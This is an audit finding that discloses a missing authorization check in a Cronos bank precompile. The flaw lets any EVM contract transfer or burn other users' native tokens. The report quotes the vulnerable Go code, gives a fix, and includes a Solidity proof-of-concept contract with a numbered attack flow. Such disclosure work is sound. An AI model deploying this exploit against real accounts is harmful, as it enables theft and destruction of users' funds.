### Title
Unauthorized Transfer and Burn of Native Tokens via Missing Caller Authorization in Bank Precompile `transfer` and `burn` - (`x/cronos/keeper/precompiles/bank.go`)

### Summary

The `BankContract` precompile's `transfer` and `burn` handlers accept an arbitrary `sender`/`from` address as a function argument without verifying it matches the calling contract. Any EVM contract can invoke `bank.transfer(victim, attacker, amount)` or `bank.burn(victim, amount)` to move or destroy native tokens of denom `evm/<calling_contract_address>` from any user's account without their consent.

### Finding Description

The bank precompile is deployed at `0x0000000000000000000000000000000000000064` and is callable by any EVM contract. Its `Run` function handles `transfer` and `burn` by deriving the token denom from `contract.Caller()` (the calling contract's address), but takes the **source address** from the raw ABI arguments — with no check that the argument matches the caller.

For `burn`:

```go
recipient := args[0].(common.Address)          // arbitrary address from calldata
addr := sdk.AccAddress(recipient.Bytes())
// ...
denom := EVMDenom(contract.Caller())           // denom = "evm/<calling_contract>"
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
``` [1](#0-0) 

For `transfer`:

```go
sender := args[0].(common.Address)             // arbitrary address from calldata
// ...
from := sdk.AccAddress(sender.Bytes())
// ...
denom := EVMDenom(contract.Caller())           // denom = "evm/<calling_contract>"
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [2](#0-1) 

There is no guard of the form `require sender == contract.Caller()` or any allowance/approval mechanism. The only check performed is `checkBlockedAddr`, which only rejects Cosmos module accounts as recipients. [3](#0-2) 

The bank precompile address is hardcoded and publicly accessible: [4](#0-3) 

### Impact Explanation

**Critical** — Unauthorized transfer and burn of precompile-controlled assets.

A malicious EVM contract `M` deployed at address `0xM` can:

1. **Steal** native tokens of denom `evm/0xM` from any user by calling `bank.transfer(victim, attacker, balance)` — transferring the victim's balance to the attacker with no approval.
2. **Destroy** native tokens of denom `evm/0xM` from any user by calling `bank.burn(victim, balance)` — burning the victim's balance without consent.

Users accumulate `evm/0xM` balances by calling `moveToNative`-style functions (as shown in `TestBank`), which burn ERC-20 tokens and mint the corresponding native denom. Once a user holds `evm/0xM`, the contract owner (or any caller of `M`) can drain or destroy those balances at will. [5](#0-4) 

### Likelihood Explanation

**High** — The bank precompile is reachable by any deployed EVM contract with a single call. No special privilege, leaked key, or governance action is required. The attacker only needs to deploy a contract and have users interact with it (or find an existing contract whose users hold native balances). The missing check is a single line of code.

### Recommendation

In both the `burn` and `transfer` cases, enforce that the source address equals the calling contract:

```go
// For burn:
if recipient != contract.Caller() {
    return nil, errors.New("burn: sender must be the calling contract")
}

// For transfer:
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

Alternatively, implement an ERC-20-style allowance mechanism so that users can explicitly approve a contract to spend their native tokens.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract MaliciousContract {
    address constant BANK = 0x0000000000000000000000000000000000000064;
    IBankModule bank = IBankModule(BANK);

    // Burns victim's native tokens of denom "evm/<this contract address>"
    // without victim's consent
    function drainVictim(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }

    // Transfers victim's native tokens to attacker
    function stealFromVictim(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

**Attack flow:**

1. Attacker deploys `MaliciousContract` at address `0xM`.
2. Victim calls `MaliciousContract.moveToNative(100)` (or any function that calls `bank.mint`), acquiring 100 native tokens of denom `evm/0xM`.
3. Attacker calls `MaliciousContract.stealFromVictim(victim, attacker, 100)`.
4. The bank precompile executes `SendCoins(victim → attacker, 100 evm/0xM)` with no authorization check.
5. Victim's balance is zero; attacker holds 100 `evm/0xM`.

The `burn` path is identical but destroys the victim's balance instead of redirecting it. [6](#0-5)

		return err
